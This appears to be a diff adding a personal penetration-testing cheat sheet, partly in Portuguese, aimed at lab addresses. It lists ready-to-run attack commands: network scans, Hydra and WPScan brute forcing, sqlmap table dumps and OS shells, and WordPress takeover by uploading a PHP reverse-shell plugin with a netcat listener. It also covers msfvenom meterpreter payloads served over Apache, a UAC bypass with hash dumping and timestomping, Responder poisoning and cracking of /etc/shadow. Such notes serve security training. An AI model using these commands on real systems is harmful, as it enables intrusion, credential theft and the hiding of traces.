@@ -1,0 +1,260 @@
+Nmap:
+SYN SCAN: nmap -v -sS 192.168.200.131
+-sV -O -A
+TCP Connect Scan: nmap -v -sT 192.168.200.131
+
+-->Stealth Scanning
+FIN Scan: nmap -v -sF 192.168.200.131
+Xmas Tree Scan: nmap -v -sX 192.168.200.131
+Null Scan: nmap -v -sN 192.168.200.131
+
+Ping Scan: nmap -v -sP 192.168.200.131
+UDP Scan: nmap -v -sU 192.168.200.131
+IP Protocol Scan: nmap -v -sO 192.168.200.131
+ACK Scan: nmap -v -sA 192.168.200.131
+Window Scan: nmap -v -sW 192.168.200.131
+RPC Scan: nmap -v -sR 192.168.200.131
+List Scan: nmap -v -sL 192.168.200.131
+ICMP Echo Request Ping: nmap -v -PE/-PI 192.168.200.131
+
+-->Mais furtivos:
+TCP ACK Ping Scan: nmap -v -PA80,22 192.168.200.131
+TCP SYN Ping Scan: nmap -v -PS 192.168.200.131
+
+UDP Ping Scan: nmap -v -PU 192.168.200.131
+
+Não Pingar: -P0,-PN,-PD
+Não resolver nome: -n
+Sistema Operacional: -O
+Avançado: -A
+Decoy: Olhar depois.
+Timing: T0,T1,T2,T3,T4,T5
+Script: -sC
+nmap -sSV -O 10.10.10.12 -oN Enumeration.txt
+
+OBS:
+Identificar hosts na rede: nmap -sP 192.168.200.1-255 / arp-scan --local / netdiscover -i eth1 / arp-scan --local -I eth1
+Scan Completo: nmap -A 192.168.200.131
+Scan UDP: nmap -sU -p 53,161,162,123,33 192.168.200.131
+Idle Scan: nmap -sI 10.10.1.2 -Pn 10.10.10.10 (nmap -sI Zombie -Pn -p20-25,110 -r --packet-trace -v Target)
+Scan snmp: nmap -sU -p 192.168.200.131 / nmap -sU -p 161 --script=snmp-brute 192.168.200.131
+Scan ftp: nmap -p 21 192.168.200.131
+------------------------------------------------------------------------------------------------------------------
+Hydra
+hydra -L <Wordlist_User> -P <Wordlist_Password> -V serviço://IP ou IP serviço(ftp/ssh/smb/rdp)
+EX: hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt -V ftp://192.168.200.131 ou 192.168.200.131 ftp
+ftp 192.168.200.131
+
+OBS: 
+Wordlists Parrot:  /usr/share/wordlists/ /usr/share/wordlists/rockyou.txt /usr/share/wordlists/metasploit
+---------------------------------------------------------------------------------------------------------------
+Sqlmap
+sqlmap -u "http://www.target.com/viewprofile.aspx?id=1" --cookie=<"cookie value"> --dbs
+sqlmap -u "http://www.target.com/viewprofile.aspx?id=1" --cookie=<"cookie value"> -D target --tables
+sqlmap -u "http://www.target.com/viewprofile.aspx?id=1" --cookie=<"cookie value"> -D target -T User_Login --columns
+sqlmap -u "http://www.target.com/viewprofile.aspx?id=1" --cookie=<"cookie value"> -D target -T User_Login --dump
+sqlmap -u "http://www.target.com/viewprofile.aspx?id=1" --cookie=<"cookie value"> --os-shell
+hostname
+ifconfig
+-------------------------------------------------------------------------------------------------------------------
+Wpscan
+wpscan --url <TARGET>
+wpscan --url <TARGET> --enumerate u
+wpscan --url <TARGET> -U admin --password /usr/share/wordlists/rockyou.txt
+
+2 Tipos de ataque:
+- Criar um plugin
+- Alterar a página de retorno de erro
+
+| Cria um plugin
+Diretório de shell php: /usr/share/webshells/php/php-reverse-shell.php
+cp /usr/share/webshells/php/php-reverse-shell.php /Desktop/root/plugin.php
+cd /Desktop/root/
+nano plugin.php
+	/*
+	Plugin Name: Reverse
+	Plugin URI: google.com
+	Description: Plugin Reverse
+	Version: 1.0
+	Author: Reverso
+	Author URI: google.com
+	*/
+zip plugin.zip plugin.php
+nc -lvp 1234
+Go to Wordpress -> Dashboard -> Plugins -> Upload -> Browse -> plugin.zip -> Activate Plugin
+cat /var/www/wordpress/wp-config.php
+su
+id
+
+|Alterar a página de retorno de erro
+Go to Wordpress -> Dashboard -> Appearance -> Editor -> 404 Page -> copia e cola o plugin.php -> Update File
+nc -lvp 1234
+Chamar uma página que retorne 404.
+cat /var/www/wordpress/wp-config.php
+su
+id
+---------------------------------------------------------------------------------------------------------------
+Nikto
+nikto -h
+nikto -h http://www.target.com -Tuning 1
+---------------------------------------------------------------------------------------------------------------
+John
+john hashes.txt (user:password)
+john --wordlist=/root/Wordlist/password.txt /home/attacker/Responder/logs/SMB-NTLMv2-SSP-192.168.200.131.txt (Quebrar Senha Capturada com Responder)
+john -wordlist:password.txt hash.txt
+unshadow /etc/passwd /etc/shadow >> senha.db
+john senha.db
+OBS: 
+Wordlists Parrot:  /usr/share/wordlists/ /usr/share/wordlists/rockyou.txt /usr/share/wordlists/metasploit
+----------------------------------------------------------------------------------------------------------------
+Hashcat
+hashcat -a 0 -m 5600 hash.txt password.txt --force
+"-m 0" == MD5 Hash
+"-m 5600" == NetNTLMv2
+"-m 1000" == NTLMv1
+OBS: 
+Wordlists Parrot:  /usr/share/wordlists/ /usr/share/wordlists/rockyou.txt /usr/share/wordlists/metasploit
+-----------------------------------------------------------------------------------------------------------------
+Metasploit
+service postgresql start / systemctl start postgresql
+msfconsole
+db_status
+msfdb init
+service postgresql restart / systemctl restart postgresql
+db_status
+| Scanner smb
+use scanner/smb/smb_version
+show options
+set RHOSTS 192.168.200.131
+set THREADS 100
+run
+hosts
+| Gerar Payload e Transportar
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.200.131 LPORT=444 -o /root/Desktop/payload.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+mv /root/Desktop/Test.exe /var/www/html/share
+service apache2 start | systemctl start apache2
+| Subir um Listener
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.200.131
+set LPORT 444
+exploit -j
+| Gerar Payload com encoding e Transportar
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=192.168.200.131 LPORT=444 -f exe > Desktop/Exploit.exe
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+ls -la /var/www/html/ | grep share
+service apache2 start | systemctl start apache2
+cp /root/Desktop/Exploit.exe /var/www/html/share/
+| Listener **
+|Escalar privilégio
+background
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.200.131
+set TARGET 0
+exploit
+getuid
+getsystem
+getuid
+run post/windows/gather/smart_hashdump
+| Outros comandos
+timestomp <arquivo>
+download
+upload
+search -f "filename.ext"(senhas.txt)
+search
+|Explorar snmp
+msfconsole
+use auxiliary/scanner/snmp/snmp_login
+show options
+set RHOSTS 192.168.200.131
+exploit
+use auxiliary/scanner/snmp/snmp_enum
+set RHOSTS 192.168.200.131
+exploit
+---------------------------------------------------------------------------------------------------------
+Responder LLMNR
+git clone https://github.com/SpiderLabs/Responder
+cd Responder
+chmod +x Responder.py 
+./Responder.py -I eth0
+ou
+responder -I eth0
+-----------------------------------------------------------------------------------------------------------
+Wireshark
+FILTRO - EXEMPLO
+ip.addr - ip.addr == 10.10.10.10
+ip.dst - ip.addr == 10.10.10.10
+ip.src - ip.src == 10.10.10.10
+ip.proto - ip.proto == 1
+ipv6.addr - ipv6.addr == 2001 :: 5
+ipv6.src - ipv6.addr == 2001 :: 5
+ipv6.dst - ipv6.dst == 2001 :: 5
+tcp.port - tcp.port == 20
+tcp.dstport - tcp.dstport == 80
+tcp.srcport - tcp.srcport == 60234
+udp.port - udp.port == 513
+udp.dstport - udp.dstport == 513
+udp.srcport - udp.srcport == 40000
+icmp.type - icmp.type == 8
+http.request.method=="POST"
+http.request.method=="GET"
+OBS:
+Botão direito -> Follow -> HTTP(TCP, UDP, HTTP) Stream
+---------------------------------------------------------------------------------------------------------------
+Steghide
+apt-get install steghide
+steghide --help
+steghide embed -ef mensagem.txt -cf Desktop/foto.jpeg (esconder arquivo texto na foto)
+-e none (Caso não queira utilizar criptografia)
+steghide extract -sf foto.jpeg (extração do arquivo texto)
+md5sum
+steghide info foto.jpeg
+----------------------------------------------------------------------------------------------------------------
+OpenStego(AES 128 e AES 256)
+Hide Data: Message File, Cover File, Output Stego File, password(opcional)
+Extract Data: Input Stego File, Output Folder for Message File, password(opcional)
+fciv.exe (para tirar o hash das duas imagens)
+----------------------------------------------------------------------------------------------------------------
+QuickStego
+Open Image -> Open Text -> Hidden Text -> Save Image
+Open Image
+----------------------------------------------------------------------------------------------------------------
+Dirb
+dirb http://www.target.com
+----------------------------------------------------------------------------------------------------------------
+Searchsploit
+searchsploit ms17-010
+searchsploit -m eternalblue windows/remote/42031.py
+
+OBS:
+/usr/share/exploitdb/exploits/
+----------------------------------------------------------------------------------------------------------------
+Crunch
+crunch [min] [max] [caracteres] > [arquivo destino]
+crunch 6 8 1234567890 > senhas.txt
+----------------------------------------------------------------------------------------------------------------
+Cewl
+cewl www.target.com -d 2 -m 5
+----------------------------------------------------------------------------------------------------------------
+Veracrypt
+Create a Volume -> Create an encrypte file container -> Next -> Standard VeraCrypt Volume -> Next -> Select File -> Specify Path and File Name (Desktop) and (MyVolume) -> Save -
+-> Next -> Encryption Options AES(Encryption Algorithm) SHA-512(Hash Algorithm) -> Next -> Volume Size 2 megabyte -> Next -> Password:qwerty@123 -> Next -> Yes -> Move your mouse randomsly 30 seconds -> Format -
+-> VeraCrypt will create MyVolume -> Exit ->Select (I:) -> Select File C:\Users\Administrator\Desktop\MyVolume and Open -> Mount -> Password:qwerty@123 -> OK -
+-> Create a Text Document on Desktop and rename it to Test, save and copy to I: -> VeraCrypt, Dismount, Exit -> I:\ disappear from Computer its selfguarded and secure
+----------------------------------------------------------------------------------------------------------------
+Hashcalc
+...
+----------------------------------------------------------------------------------------------------------------
+Rainbow Crack
+
+----------------------------------------------------------------------------------------------------------------
+
+
